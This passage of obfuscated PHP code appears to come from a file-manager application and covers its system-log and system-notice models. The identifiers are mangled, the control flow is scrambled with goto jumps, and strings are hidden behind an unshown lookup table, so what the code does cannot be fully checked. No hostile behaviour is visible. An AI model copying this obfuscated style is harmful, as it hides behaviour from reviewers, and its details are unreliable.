remove($bÆí…Œ¶ä™) { $aÅÛ“İÓÒ¶ = $this->findByName($bÆí…Œ¶ä™); if (!$aÅÛ“İÓÒ¶) { return !1; } return parent::remove($aÅÛ“İÓÒ¶[$_SERVER[ã®Â„Éæ¹¤][367]]); } public function add($FË £ñ£÷ì) { if ($this->findByName($FË £ñ£÷ì[$_SERVER[ã®Â„Éæ¹¤][28]])) { return !1; } return parent::insert($FË £ñ£÷ì); } public function update($e°ë†à†Œ—, $CåŸ„ÑŒÚ) { $A—ò·ÄÉùğ =& $_SERVER[ã®Â„Éæ¹¤]; $D„¹Áğ¤¼½ = $this->findByName($e°ë†à†Œ—); $CŠ®Õ¡„ƒ¸ = $this->findByName($CåŸ„ÑŒÚ[$A—ò·ÄÉùğ[28]]); if (!$D„¹Áğ¤¼½ || $CŠ®Õ¡„ƒ¸ && $CŠ®Õ¡„ƒ¸[$A—ò·ÄÉùğ[367]] != $D„¹Áğ¤¼½[$A—ò·ÄÉùğ[367]]) { return !1; } return parent::update($D„¹Áğ¤¼½[$A—ò·ÄÉùğ[367]], $CåŸ„ÑŒÚ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\137\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\151\155\x65", "\164\x69\155\x65", "\x69\x6e\x73\x65\x72\164", "\x66\x75\x6e\x63\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $bëö–—ªÖ =& $_SERVER[ã®Â„Éæ¹¤]; return array($bëö–—ªÖ[2432] => LNG($bëö–—ªÖ[2433]), $bëö–—ªÖ[2434] => LNG($bëö–—ªÖ[2435]), $bëö–—ªÖ[2066] => LNG($bëö–—ªÖ[2436]), $bëö–—ªÖ[2437] => LNG($bëö–—ªÖ[2438]), $bëö–—ªÖ[2439] => LNG($bëö–—ªÖ[2440]), $bëö–—ªÖ[2441] => LNG($bëö–—ªÖ[2442]), $bëö–—ªÖ[2443] => LNG($bëö–—ªÖ[2444]), $bëö–—ªÖ[2445] => LNG($bëö–—ªÖ[2446]), $bëö–—ªÖ[2097] => LNG($bëö–—ªÖ[2447]), $bëö–—ªÖ[2098] => LNG($bëö–—ªÖ[2448]), $bëö–—ªÖ[2449] => LNG($bëö–—ªÖ[2450]), $bëö–—ªÖ[2451] => LNG($bëö–—ªÖ[2452]), $bëö–—ªÖ[2453] => LNG($bëö–—ªÖ[2454]), $bëö–—ªÖ[2455] => LNG($bëö–—ªÖ[2456]), $bëö–—ªÖ[2095] => LNG($bëö–—ªÖ[2457]), $bëö–—ªÖ[2102] => LNG($bëö–—ªÖ[2458]), $bëö–—ªÖ[2459] => LNG($bëö–—ªÖ[2460]), $bëö–—ªÖ[2461] => LNG($bëö–—ªÖ[2462]), $bëö–—ªÖ[2463] => LNG($bëö–—ªÖ[2464]), $bëö–—ªÖ[2465] => LNG($bëö–—ªÖ[2466]), $bëö–—ªÖ[2105] => LNG($bëö–—ªÖ[2467]), $bëö–—ªÖ[2106] => LNG($bëö–—ªÖ[2468]), $bëö–—ªÖ[2469] => LNG($bëö–—ªÖ[2470]), $bëö–—ªÖ[2471] => LNG($bëö–—ªÖ[2472]), $bëö–—ªÖ[2473] => LNG($bëö–—ªÖ[2474]), $bëö–—ªÖ[2100] => LNG($bëö–—ªÖ[2475]), $bëö–—ªÖ[2476] => LNG($bëö–—ªÖ[2477]), $bëö–—ªÖ[2099] => LNG($bëö–—ªÖ[2478]), $bëö–—ªÖ[2479] => LNG($bëö–—ªÖ[2480]), $bëö–—ªÖ[2481] => LNG($bëö–—ªÖ[2482]), $bëö–—ªÖ[2483] => LNG($bëö–—ªÖ[2483]), $bëö–—ªÖ[2484] => LNG($bëö–—ªÖ[2070]), $bëö–—ªÖ[2485] => LNG($bëö–—ªÖ[2486]), $bëö–—ªÖ[2487] => LNG($bëö–—ªÖ[2488]), $bëö–—ªÖ[2489] => LNG($bëö–—ªÖ[2490]), $bëö–—ªÖ[2491] => LNG($bëö–—ªÖ[2492]), $bëö–—ªÖ[2493] => LNG($bëö–—ªÖ[2494]), $bëö–—ªÖ[2495] => LNG($bëö–—ªÖ[2495]), $bëö–—ªÖ[2496] => LNG($bëö–—ªÖ[2497]), $bëö–—ªÖ[2498] => LNG($bëö–—ªÖ[2499]), $bëö–—ªÖ[2500] => LNG($bëö–—ªÖ[2501]), $bëö–—ªÖ[2502] => LNG($bëö–—ªÖ[2503]), $bëö–—ªÖ[2504] => LNG($bëö–—ªÖ[2505]), $bëö–—ªÖ[2506] => LNG($bëö–—ªÖ[2507])); } private function typeFile() { $bÊˆÏ¸¦ù’ =& $_SERVER[ã®Â„Éæ¹¤]; $CãÚ¾ÊÔÛ¦ = array($bÊˆÏ¸¦ù’[2102] => array($bÊˆÏ¸¦ù’[2103]), $bÊˆÏ¸¦ù’[2453] => array($bÊˆÏ¸¦ù’[2508]), $bÊˆÏ¸¦ù’[2455] => array($bÊˆÏ¸¦ù’[2509]), $bÊˆÏ¸¦ù’[2095] => array($bÊˆÏ¸¦ù’[2096]), $bÊˆÏ¸¦ù’[2461] => array(), $bÊˆÏ¸¦ù’[2463] => array(), $bÊˆÏ¸¦ù’[2465] => array(), $bÊˆÏ¸¦ù’[2105] => array($bÊˆÏ¸¦ù’[2107]), $bÊˆÏ¸¦ù’[2106] => array($bÊˆÏ¸¦ù’[2107]), $bÊˆÏ¸¦ù’[2469] => array($bÊˆÏ¸¦ù’[2510]), $bÊˆÏ¸¦ù’[2471] => array($bÊˆÏ¸¦ù’[2510]), $bÊˆÏ¸¦ù’[2473] => array($bÊˆÏ¸¦ù’[2511]), $bÊˆÏ¸¦ù’[2459] => array($bÊˆÏ¸¦ù’[2512]), $bÊˆÏ¸¦ù’[2100] => array($bÊˆÏ¸¦ù’[2513]), $bÊˆÏ¸¦ù’[2476] => array($bÊˆÏ¸¦ù’[2514]), $bÊˆÏ¸¦ù’[2099] => array($bÊˆÏ¸¦ù’[2101])); return $CãÚ¾ÊÔÛ¦; } private function typeAll() { goto c˜Ş¬®¾×Æ; CäÌ¥ÊÅƒÍ: foreach ($d¡›ÁÊ‡Ø as $fä¥«²±  => $C…“ÇËáÁ) { $dóÍÀ‹Œ¡[$C…“ÇËáÁ[0]] = $dóÍÀ‹Œ¡[$fä¥«²± ]; } $dóÍÀ‹Œ¡[$D« ôµŠ™ì[2107]] = LNG($D« ôµŠ™ì[2515]); $dóÍÀ‹Œ¡[$D« ôµŠ™ì[2510]] = LNG($D« ôµŠ™ì[2516]); goto d¶·¥•µæ˜; d¶·¥•µæ˜: return $dóÍÀ‹Œ¡; goto D‚Æ®ÀäÊ; c˜Ş¬®¾×Æ: $D« ôµŠ™ì =& $_SERVER[ã®Â„Éæ¹¤]; $dóÍÀ‹Œ¡ = $this->typeList; $d¡›ÁÊ‡Ø = array_filter($this->typeFile()); goto CäÌ¥ÊÅƒÍ; D‚Æ®ÀäÊ: } public function addLog($añø‘òøµì, $C£œÁ©à“Ô = array()) { goto Bâ‘Ä¼¯‹ƒ; Fµ°‘‡ğƒ²: if (!$f‘Ù¥¬—Îƒ) { $f‘Ù¥¬—Îƒ = (int) Session::get($bÏÛôŒØ•‚[2247]); } $fÇµÖÈÌÍ„ = get_client_ip(); if (!$C£œÁ©à“Ô || strlen(json_encode($C£œÁ©à“Ô)) >= 1024) { $C£œÁ©à“Ô = array($bÏÛôŒØ•‚[2517] => $fÇµÖÈÌÍ„); } else { if (is_array($C£œÁ©à“Ô)) { $C£œÁ©à“Ô[$bÏÛôŒØ•‚[2517]] = $fÇµÖÈÌÍ„; } else { $C£œÁ©à“Ô = array($bÏÛôŒØ•‚[1053] => $C£œÁ©à“Ô, $bÏÛôŒØ•‚[2517] => $fÇµÖÈÌÍ„); } } goto d¶²¢Œòµ; d¶²¢Œòµ: $C£œÁ©à“Ô = array($bÏÛôŒØ•‚[1446] => Session::sign(), $bÏÛôŒØ•‚[1447] => $f‘Ù¥¬—Îƒ, $bÏÛôŒØ•‚[29] => $añø‘òøµì, $bÏÛôŒØ•‚[1449] => json_encode($C£œÁ©à“Ô)); parent::add($C£œÁ©à“Ô); goto c¼î˜÷„Éï; Bâ‘Ä¼¯‹ƒ: $bÏÛôŒØ•‚ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($this->typeList[$añø‘òøµì])) { return; } $f‘Ù¥¬—Îƒ = defined($bÏÛôŒØ•‚[427]) && USER_ID ? USER_ID : (isset($C£œÁ©à“Ô[$bÏÛôŒØ•‚[1456]]) ? $C£œÁ©à“Ô[$bÏÛôŒØ•‚[1456]] : 0); goto Fµ°‘‡ğƒ²; c¼î˜÷„Éï: } public function remove($BÎÌš·‚¸ƒ) { $this->where(array($_SERVER[ã®Â„Éæ¹¤][385] => $BÎÌš·‚¸ƒ))->delete(); } private function _makeOrder($DˆÎİ¦‰ì» = '') { goto fÒõ¾‚öÈ‰; dëß«£ß±‹: $fí©Óç¨àÈ = Input::get($FŒ§•çáê[408], $FŒ§•çáê[7], $FŒ§•çáê[2281], array($FŒ§•çáê[2207], $FŒ§•çáê[404])); $fí©Óç¨àÈ = $c·¥æÎ×Ü[$fí©Óç¨àÈ]; $DˆÎİ¦‰ì» = $DˆÎİ¦‰ì» . "{$AÙµñ£Ä™}\40{$fí©Óç¨àÈ}"; goto bóÉ”²«ã’; fÒõ¾‚öÈ‰: $FŒ§•çáê =& $_SERVER[ã®Â„Éæ¹¤]; $AÙµñ£Ä™ = $FŒ§•çáê[187]; $c·¥æÎ×Ü = array($FŒ§•çáê[402] => $FŒ§•çáê[403], $FŒ§•çáê[404] => $FŒ§•çáê[405]); goto dëß«£ß±‹; bóÉ”²«ã’: return $this->order($DˆÎİ¦‰ì»); goto Fí…££¥ÍÉ; Fí…££¥ÍÉ: } public function get($eê’©÷¢ÊÌ = '') { goto dğîÔä’°…; a–ä¨°•äŒ: if ($eê’©÷¢ÊÌ[$f»³ƒ¿ß[1456]]) { $E·‹‹ô›§[$f»³ƒ¿ß[1456]] = $eê’©÷¢ÊÌ[$f»³ƒ¿ß[1456]]; } if (isset($eê’©÷¢ÊÌ[$f»³ƒ¿ß[724]])) { $A÷Ìá‚¨Ï = $eê’©÷¢ÊÌ[$f»³ƒ¿ß[724]]; $Bîš˜ïÂË = isset($eê’©÷¢ÊÌ[$f»³ƒ¿ß[449]]) ? $eê’©÷¢ÊÌ[$f»³ƒ¿ß[449]] : time(); $E·‹‹ô›§[$f»³ƒ¿ß[187]] = array($f»³ƒ¿ß[321], array($A÷Ìá‚¨Ï, $Bîš˜ïÂË)); } if ($eê’©÷¢ÊÌ[$f»³ƒ¿ß[29]]) { $D…å°¸‘Å„ = explode($f»³ƒ¿ß[47], $eê’©÷¢ÊÌ[$f»³ƒ¿ß[29]]); $EÔ¬µƒæ±å = $this->typeFile(); $AĞ—õõÅ”´ = array(); foreach ($D…å°¸‘Å„ as $Eš‡éæ³¨Ù) { $AĞ—õõÅ”´[] = $Eš‡éæ³¨Ù; if (isset($EÔ¬µƒæ±å[$Eš‡éæ³¨Ù])) { $AĞ—õõÅ”´ = array_merge($AĞ—õõÅ”´, $EÔ¬µƒæ±å[$Eš‡éæ³¨Ù]); } } $AĞ—õõÅ”´ = array_unique($AĞ—õõÅ”´); if ($AĞ—õõÅ”´) { $E·‹‹ô›§[$f»³ƒ¿ß[29]] = array($f»³ƒ¿ß[7], $AĞ—õõÅ”´); } } goto F’‚á†Œ‹; F’‚á†Œ‹: if (!empty($eê’©÷¢ÊÌ[$f»³ƒ¿ß[2517]])) { $E·‹‹ô›§[$f»³ƒ¿ß[405]] = array($f»³ƒ¿ß[774], "\x25{$eê’©÷¢ÊÌ[$f»³ƒ¿ß[2517]]}\x25"); } $E¯âŠïö½Ğ = $this->_makeOrder()->where($E·‹‹ô›§)->selectPage(); if (empty($E¯âŠïö½Ğ[$f»³ƒ¿ß[354]])) { show_json(array(), !0, $E¯âŠïö½Ğ[$f»³ƒ¿ß[351]]); } goto A‘Ûíêµ”¢; A‘Ûíêµ”¢: $E¯âŠïö½Ğ[$f»³ƒ¿ß[354]] = $this->logList($E¯âŠïö½Ğ[$f»³ƒ¿ß[354]]); return $E¯âŠïö½Ğ; goto fí¾èÍ©æ©; dğîÔä’°…: $f»³ƒ¿ß =& $_SERVER[ã®Â„Éæ¹¤]; if (!$eê’©÷¢ÊÌ) { show_json(array()); } $E·‹‹ô›§ = array(); goto a–ä¨°•äŒ; fí¾èÍ©æ©: } private function ipAddress(&$aŠ¤®•ß©) { $cŠìáÚô =& $_SERVER[ã®Â„Éæ¹¤]; if (!empty($aŠ¤®•ß©[$cŠìáÚô[2517]])) { $E â›ìòí  = IpLocation::get($aŠ¤®•ß©[$cŠìáÚô[2517]]); } else { $E â›ìòí  = LNG($cŠìáÚô[2518]); } $aŠ¤®•ß©[$cŠìáÚô[2519]] = $E â›ìòí ; } private function descZipDownload($D·¿Á”Óø„, &$FÒ„Éôï¤) { $fÚí‹ô´ñ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($D·¿Á”Óø„[$fÚí‹ô´ñ[2520]])) { return; } $B‹¹äˆÌˆº = json_decode($D·¿Á”Óø„[$fÚí‹ô´ñ[2520]], !0); foreach ($B‹¹äˆÌˆº as $cË¢¤ïÔ›) { if (!IO::init($cË¢¤ïÔ›[$fÚí‹ô´ñ[75]])) { continue; } if (!($E£¶Ã¥‡  = IO::infoFull($cË¢¤ïÔ›[$fÚí‹ô´ñ[75]]))) { continue; } $D·¿Á”Óø„[$fÚí‹ô´ñ[75]] = $cË¢¤ïÔ›[$fÚí‹ô´ñ[75]]; $FÒ„Éôï¤[] = $D·¿Á”Óø„[$fÚí‹ô´ñ[369]] = $E£¶Ã¥‡ [$fÚí‹ô´ñ[369]]; $FÒ„Éôï¤[] = $D·¿Á”Óø„[$fÚí‹ô´ñ[2336]] = $E£¶Ã¥‡ [$fÚí‹ô´ñ[463]]; break; } return $D·¿Á”Óø„; } private function getSourceList(&$d¬˜ğóİ®Î) { $fÉë”åŞÛ =& $_SERVER[ã®Â„Éæ¹¤]; $fµÁ“Ï³¥Ò = array(); foreach ($d¬˜ğóİ®Î as $B’§æ†ÚÙ¿ => $CçÒÖ“İÜ) { goto AÉ°é‹¦˜‘; B‹·ÎùéË³: if ($EÆƒÅ“»†Î[$fÉë”åŞÛ[29]] == $fÉë”åŞÛ[2344]) { $fµÁ“Ï³¥Ò[] = $EÆƒÅ“»†Î[$fÉë”åŞÛ[405]][$fÉë”åŞÛ[369]]; } goto C©™¥ÕÎ‰; DØÍèóãñî: $fµÁ“Ï³¥Ò[] = $EÆƒÅ“»†Î[$fÉë”åŞÛ[369]]; $fµÁ“Ï³¥Ò[] = $EÆƒÅ“»†Î[$fÉë”åŞÛ[2336]]; if ($EÆƒÅ“»†Î[$fÉë”åŞÛ[29]] == $fÉë”åŞÛ[494]) { $fµÁ“Ï³¥Ò[] = $EÆƒÅ“»†Î[$fÉë”åŞÛ[405]][$fÉë”åŞÛ[1026]]; $fµÁ“Ï³¥Ò[] = $EÆƒÅ“»†Î[$fÉë”åŞÛ[405]][$fÉë”åŞÛ[1027]]; } goto B‹·ÎùéË³; AÉ°é‹¦˜‘: $EÆƒÅ“»†Î = json_decode($CçÒÖ“İÜ[$fÉë”åŞÛ[405]], !0); if ($CçÒÖ“İÜ[$fÉë”åŞÛ[29]] == $fÉë”åŞÛ[2098]) { $EÆƒÅ“»†Î = $this->descZipDownload($EÆƒÅ“»†Î, $fµÁ“Ï³¥Ò); $d¬˜ğóİ®Î[$B’§æ†ÚÙ¿][$fÉë”åŞÛ[405]] = json_encode($EÆƒÅ“»†Î); continue; } if (strpos($CçÒÖ“İÜ[$fÉë”åŞÛ[29]], $fÉë”åŞÛ[2337]) !== 0) { goto C«ÑÒ•èŒ; C«ÑÒ•èŒ: if (!isset($EÆƒÅ“»†Î[$fÉë”åŞÛ[75]]) || strpos($CçÒÖ“İÜ[$fÉë”åŞÛ[29]], $fÉë”åŞÛ[2521]) !== 0) { continue; } if (!IO::init($EÆƒÅ“»†Î[$fÉë”åŞÛ[75]])) { continue; } if (!($aÖ¹æĞÅ« = IO::infoFull($EÆƒÅ“»†Î[$fÉë”åŞÛ[75]]))) { continue; } goto BªŒ¶©‡õ ; BªŒ¶©‡õ : $fµÁ“Ï³¥Ò[] = $EÆƒÅ“»†Î[$fÉë”åŞÛ[369]] = $aÖ¹æĞÅ«[$fÉë”åŞÛ[369]]; $fµÁ“Ï³¥Ò[] = $EÆƒÅ“»†Î[$fÉë”åŞÛ[2336]] = $aÖ¹æĞÅ«[$fÉë”åŞÛ[463]]; $d¬˜ğóİ®Î[$B’§æ†ÚÙ¿][$fÉë”åŞÛ[405]] = json_encode($EÆƒÅ“»†Î); goto E‚ª“ŒºÖÕ; E‚ª“ŒºÖÕ: continue; goto FôˆÛ§‰Ô›; FôˆÛ§‰Ô›: } goto DØÍèóãñî; C©™¥ÕÎ‰: } if (!$fµÁ“Ï³¥Ò) { return array(); } return Model($fÉë”åŞÛ[775])->sourceListInfo($fµÁ“Ï³¥Ò, !0); } private function logList($cŒö‡£óïŸ) { goto EÅÃã„§®; EÅÃã„§®: $Dî†íÙÒ© =& $_SERVER[ã®Â„Éæ¹¤]; $fÌ¹³àÜ•ğ = array_to_keyvalue($cŒö‡£óïŸ, $Dî†íÙÒ©[33], $Dî†íÙÒ©[1456]); $BËôÛ¬ÁÁí = Model($Dî†íÙÒ©[479])->userListInfo(array_unique($fÌ¹³àÜ•ğ)); goto EÙâƒµğíõ; F½‚î‚ˆ¬”: $F£×µî²…à = array(); foreach ($cŒö‡£óïŸ as $c—˜ºè¥˜ß => $eºŠËé²ˆ†) { goto E¥öˆ˜ˆî„; c¯®ÖŞŒÃ: $eºŠËé²ˆ†[$Dî†íÙÒ©[2280]] = $dîğÃ¶Ó†¢; $cø‹Ç´ˆà = json_decode($eºŠËé²ˆ†[$Dî†íÙÒ©[405]], !0); $eºŠËé²ˆ†[$Dî†íÙÒ©[2517]] = isset($cø‹Ç´ˆà[$Dî†íÙÒ©[2517]]) ? $cø‹Ç´ˆà[$Dî†íÙÒ©[2517]] : $Dî†íÙÒ©[33]; goto f”Ä³ù¥¨; CÜ¬°Š£°: $eºŠËé²ˆ†[$Dî†íÙÒ©[28]] = isset($dîğÃ¶Ó†¢[$Dî†íÙÒ©[28]]) ? $dîğÃ¶Ó†¢[$Dî†íÙÒ©[28]] : LNG($Dî†íÙÒ©[2518]); $eºŠËé²ˆ†[$Dî†íÙÒ©[2385]] = isset($dîğÃ¶Ó†¢[$Dî†íÙÒ©[2385]]) ? $dîğÃ¶Ó†¢[$Dî†íÙÒ©[2385]] : $Dî†íÙÒ©[33]; $eºŠËé²ˆ†[$Dî†íÙÒ©[1362]] = isset($FµŠÈÚò[$d¬Š¬‚¶œ]) ? $FµŠÈÚò[$d¬Š¬‚¶œ] : $AŸ‘âÅ¢Šì; goto c¯®ÖŞŒÃ; f”Ä³ù¥¨: $this->ipAddress($eºŠËé²ˆ†); if (strpos($d¬Š¬‚¶œ, $Dî†íÙÒ©[2337]) === 0 || isset($cø‹Ç´ˆà[$Dî†íÙÒ©[2336]])) { goto DÈÛğÏ„Á×; C¥³àÙ÷”: if ($cø‹Ç´ˆà[$Dî†íÙÒ©[2349]] && $cø‹Ç´ˆà[$Dî†íÙÒ©[2349]][$Dî†íÙÒ©[371]] == $Dî†íÙÒ©[1099]) { $F£×µî²…à[] = $eºŠËé²ˆ†[$Dî†íÙÒ©[367]]; unset($cŒö‡£óïŸ[$c—˜ºè¥˜ß]); continue; } goto aÓçÌ¶£ö; DÈÛğÏ„Á×: $cø‹Ç´ˆà[$Dî†íÙÒ©[391]] = $Eéš§¿­¢[$cø‹Ç´ˆà[$Dî†íÙÒ©[369]]]; $cø‹Ç´ˆà[$Dî†íÙÒ©[2349]] = $Eéš§¿­¢[$cø‹Ç´ˆà[$Dî†íÙÒ©[2336]]]; if ($cø‹Ç´ˆà[$Dî†íÙÒ©[29]] == $Dî†íÙÒ©[494]) { $cø‹Ç´ˆà[$Dî†íÙÒ©[405]][$Dî†íÙÒ©[1026]] = $Eéš§¿­¢[$cø‹Ç´ˆà[$Dî†íÙÒ©[405]][$Dî†íÙÒ©[1026]]]; $cø‹Ç´ˆà[$Dî†íÙÒ©[405]][$Dî†íÙÒ©[1027]] = $Eéš§¿­¢[$cø‹Ç´ˆà[$Dî†íÙÒ©[405]][$Dî†íÙÒ©[1027]]]; } goto B½õè…ëÀ; B½õè…ëÀ: if ($cø‹Ç´ˆà[$Dî†íÙÒ©[29]] == $Dî†íÙÒ©[2344]) { $cø‹Ç´ˆà[$Dî†íÙÒ©[405]][$Dî†íÙÒ©[369]] = $Eéš§¿­¢[$cø‹Ç´ˆà[$Dî†íÙÒ©[405]][$Dî†íÙÒ©[369]]]; } if ($cø‹Ç´ˆà[$Dî†íÙÒ©[29]] == $Dî†íÙÒ©[2093]) { $cø‹Ç´ˆà[$Dî†íÙÒ©[2349]] = $cø‹Ç´ˆà[$Dî†íÙÒ©[391]]; $cø‹Ç´ˆà[$Dî†íÙÒ©[2336]] = $cø‹Ç´ˆà[$Dî†íÙÒ©[2349]][$Dî†íÙÒ©[369]]; $cø‹Ç´ˆà[$Dî†íÙÒ©[391]] = !1; $cø‹Ç´ˆà[$Dî†íÙÒ©[369]] = $Dî†íÙÒ©[33]; } if ($cø‹Ç´ˆà[$Dî†íÙÒ©[391]] && $cø‹Ç´ˆà[$Dî†íÙÒ©[391]][$Dî†íÙÒ©[371]] == $Dî†íÙÒ©[1099]) { $F£×µî²…à[] = $eºŠËé²ˆ†[$Dî†íÙÒ©[367]]; unset($cŒö‡£óïŸ[$c—˜ºè¥˜ß]); continue; } goto C¥³àÙ÷”; aÓçÌ¶£ö: } $eºŠËé²ˆ†[$Dî†íÙÒ©[405]] = $cø‹Ç´ˆà; goto CœÂàÄ¦ƒ‘; CœÂàÄ¦ƒ‘: unset($eºŠËé²ˆ†[$Dî†íÙÒ©[2524]]); $DÓ÷‰§¢™[] = $eºŠËé²ˆ†; goto B¥øóÕ‘ÑÓ; E¥öˆ˜ˆî„: $d¬Š¬‚¶œ = $eºŠËé²ˆ†[$Dî†íÙÒ©[29]]; $dîğÃ¶Ó†¢ = isset($BËôÛ¬ÁÁí[$eºŠËé²ˆ†[$Dî†íÙÒ©[1456]]]) ? $BËôÛ¬ÁÁí[$eºŠËé²ˆ†[$Dî†íÙÒ©[1456]]] : !1; $AŸ‘âÅ¢Šì = strpos($d¬Š¬‚¶œ, $Dî†íÙÒ©[2522]) === 0 ? LNG($Dî†íÙÒ©[2523]) : LNG($Dî†íÙÒ©[2518]); goto CÜ¬°Š£°; B¥øóÕ‘ÑÓ: } $this->clearSystemPathLog($F£×µî²…à); goto f¢»ÜÓìË¥; EÙâƒµğíõ: $Eéš§¿­¢ = $this->getSourceList($cŒö‡£óïŸ); $FµŠÈÚò = $this->typeAll(); $DÓ÷‰§¢™ = array(); goto F½‚î‚ˆ¬”; f¢»ÜÓìË¥: return $DÓ÷‰§¢™; goto BÚ¦ˆÊŒÜ; BÚ¦ˆÊŒÜ: } private function clearSystemPathLog($dô©èÁ—òÄ) { $A›½Ùê¬§ =& $_SERVER[ã®Â„Éæ¹¤]; if (count($dô©èÁ—òÄ) == 0) { return; } $F“ß†‚ù·µ = array($A›½Ùê¬§[367] => array($A›½Ùê¬§[7], array_unique($dô©èÁ—òÄ))); $this->where($F“ß†‚ù·µ)->delete(); } public function deviceList($føÔ´¶š–×, $FŒ½Ä­í‘´ = 0) { $f„¸¦çÇõ’ =& $_SERVER[ã®Â„Éæ¹¤]; $BšÂ‰ÉøË = array($f„¸¦çÇõ’[1456] => $føÔ´¶š–×, $f„¸¦çÇõ’[187] => array($f„¸¦çÇõ’[946], $FŒ½Ä­í‘´), $f„¸¦çÇõ’[29] => $f„¸¦çÇõ’[2066]); $añ£Â¬»—™ = array(); $a“¡¹¶åÏ„ = $this->field($f„¸¦çÇõ’[2525])->where($BšÂ‰ÉøË)->order($f„¸¦çÇõ’[2347])->limit(50)->select(); foreach ($a“¡¹¶åÏ„ as $dåèËÙ‰ => $B¥­Ê›È) { goto DÉ¶²´»ë; c®í±É²òŠ: unset($E‹›²òÌÚì[$f„¸¦çÇõ’[2517]]); $CŠª©İ±ÊÌ = $this->deviceType($E‹›²òÌÚì[$f„¸¦çÇõ’[2338]]); if (isset($añ£Â¬»—™[$CŠª©İ±ÊÌ])) { continue; } goto BŠ½Âì®…é; BŠ½Âì®…é: $this->ipAddress($B¥­Ê›È); $B¥­Ê›È[$f„¸¦çÇõ’[405]] = $E‹›²òÌÚì; $añ£Â¬»—™[$CŠª©İ±ÊÌ] = $B¥­Ê›È; goto c²¨¶”‘À; DÉ¶²´»ë: if ($dåèËÙ‰ > 0 && abs($B¥­Ê›È[$f„¸¦çÇõ’[187]] - $a“¡¹¶åÏ„[$dåèËÙ‰ - 1][$f„¸¦çÇõ’[187]]) < 5) { continue; } $E‹›²òÌÚì = json_decode($B¥­Ê›È[$f„¸¦çÇõ’[405]], !0); $B¥­Ê›È[$f„¸¦çÇõ’[2517]] = isset($E‹›²òÌÚì[$f„¸¦çÇõ’[2517]]) ? $E‹›²òÌÚì[$f„¸¦çÇõ’[2517]] : $f„¸¦çÇõ’[33]; goto c®í±É²òŠ; c²¨¶”‘À: } return array_values($añ£Â¬»—™); } public function deviceType($bà±Ç½´Å´) { return $bà±Ç½´Å´; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x6e\157\x74\151\x63\x65\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\143\x6f\x6e\x74\x65\x6e\x74", "\x61\x75\x74\x68", "\x6d\x6f\144\x65", "\164\x69\155\x65", "\164\171\160\x65", "\154\x65\166\x65\154", "\x65\156\141\x62\154\145", "\163\x6f\x72\164"); public function listData($bÌèÏôÏ™ñ = false, $fŞîõ¦ìƒŒ = "\x73\x6f\x72\164", $C¶¡¸¼·‡ = false) { return parent::listData($bÌèÏôÏ™ñ, $fŞîõ¦ìƒŒ, $C¶¡¸¼·‡); } public function add($a“’—Ÿ¥©£) { $a‘ïßƒ÷ =& $_SERVER[ã®Â„Éæ¹¤]; $bø—Šô†ù® = time(); if ($a“’—Ÿ¥©£[$a‘ïßƒ÷[12]] == $a‘ïßƒ÷[2526]) { $bø—Šô†ù® = strtotime($a“’—Ÿ¥©£[$a‘ïßƒ÷[190]]); } $a“’—Ÿ¥©£[$a‘ïßƒ÷[190]] = $bø—Šô†ù®; return parent::insert($a“’—Ÿ¥©£); } public function update($AÜ¦»ÕÒğº, $eŠç™°è¡) { goto B—·ï¨•Øâ; Aëãâ‹ŒëÖ: return parent::update($AÜ¦»ÕÒğº, $eŠç™°è¡); goto bß¼‘´®İÇ; B—·ï¨•Øâ: $BëÜÈ¼Ú¹Ú =& $_SERVER[ã®Â„Éæ¹¤]; $F’ÎíëÖÊ£ = $this->listData($AÜ¦»ÕÒğº); if (!$F’ÎíëÖÊ£) { return !1; } goto BÅß¬ˆ‘Ò™; BÅß¬ˆ‘Ò™: $E„¨£Ë¸” = time(); if ($eŠç™°è¡[$BëÜÈ¼Ú¹Ú[12]] == $BëÜÈ¼Ú¹Ú[2526]) { $E„¨£Ë¸” = strtotime($eŠç™°è¡[$BëÜÈ¼Ú¹Ú[190]]); } $eŠç™°è¡[$BëÜÈ¼Ú¹Ú[190]] = $E„¨£Ë¸”; goto Aëãâ‹ŒëÖ; bß¼‘´®İÇ: } public function remove($cÇé»‹æ“·) { $B—®ª­İË = $this->listData($cÇé»‹æ“·); if (!$B—®ª­İË || $B—®ª­İË[$_SERVER[ã®Â„Éæ¹¤][1099]]) { return !1; } return parent::remove($cÇé»‹æ“·); } public function sort($a¹ÚÕÃ»ï, $Böç¬ÜŠ…É) { return parent::update($a¹ÚÕÃ»ï, $Böç¬ÜŠ…É); } public function enable($D„·˜»òå, $E¼ÉùŸãÉ) { return parent::update($D„·˜»òå, array($_SERVER[ã®Â„Éæ¹¤][2527] => $E¼ÉùŸãÉ)); } private function initUserOption() { $BøÂ¡Ô›Î =& $_SERVER[ã®Â„Éæ¹¤]; $this->optionType = $BøÂ¡Ô›Î[2528]; $this->modelType = $BøÂ¡Ô›Î[2529]; $this->field = array($BøÂ¡Ô›Î[2530], $BøÂ¡Ô›Î[28], $BøÂ¡Ô›Î[190], $BøÂ¡Ô›Î[29], $BøÂ¡Ô›Î[2531], $BøÂ¡Ô›Î[711], $BøÂ¡Ô›Î[183]); } public function userNoticeGet($fª‰„¦å¨ = false) { $this->initUserOption(); return parent::listData($fª‰„¦å¨, $_SERVER[ã®Â„Éæ¹¤][367], !0); } public function userNoticeAdd($FŸåÖ£¨·Ì) { $aôŠÅ¶™Úä =& $_SERVER[ã®Â„Éæ¹¤]; $this->initUserOption(); $có¥ ÄÚ¹ = $this->findByKey($aôŠÅ¶™Úä[2530], $FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[367]]); if ($có¥ ÄÚ¹) { return !0; } $c¶×­ÂÀÀ = array($aôŠÅ¶™Úä[2530] => $FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[367]], $aôŠÅ¶™Úä[28] => $FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[28]], $aôŠÅ¶™Úä[190] => $FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[190]], $aôŠÅ¶™Úä[29] => isset($FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[29]]) ? $FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[29]] : 1, $aôŠÅ¶™Úä[2531] => 